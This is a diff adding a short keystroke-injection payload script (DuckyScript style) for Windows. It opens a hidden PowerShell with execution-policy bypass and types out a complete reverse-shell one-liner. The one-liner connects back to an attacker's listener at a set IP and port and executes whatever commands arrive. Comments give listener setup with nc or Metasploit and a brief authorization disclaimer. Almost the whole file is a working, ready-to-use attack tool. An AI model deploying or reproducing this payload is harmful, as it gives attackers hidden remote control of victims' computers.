@@ -1,0 +1,21 @@
+REM ============================================================
+REM  Windows · Reverse Shell (PowerShell)
+REM ============================================================
+REM  Opens a hidden PowerShell and connects back to your listener.
+REM  Set LHOST and LPORT before running. Start your listener:
+REM    nc -lvnp 4444      (or use Metasploit multi/handler)
+REM
+REM  Authorization required: only use on systems you own or have
+REM  explicit written permission to test.
+
+DEFAULTDELAY 60
+
+DEFINE LHOST 192.168.1.100
+DEFINE LPORT 4444
+
+GUI r
+DELAY 700
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 1500
+STRINGLN $c=New-Object Net.Sockets.TCPClient('LHOST',LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()
